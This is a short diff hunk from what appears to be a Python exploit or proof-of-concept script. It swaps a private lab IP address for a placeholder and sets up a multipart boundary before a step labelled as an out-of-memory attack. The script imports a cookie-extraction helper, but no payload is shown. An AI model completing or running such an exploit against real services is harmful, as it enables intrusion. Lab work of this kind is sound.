@@ -14,7 +14,7 @@ import sys
 import time
 from common import Target, build_multipart, extract_cookie_line
 
-t = Target("192.168.8.123", 18113, verbose=False)
+t = Target("LAB_IP", 18113, verbose=False)
 bnd = b"S" * 17
 
 # step A: OOM
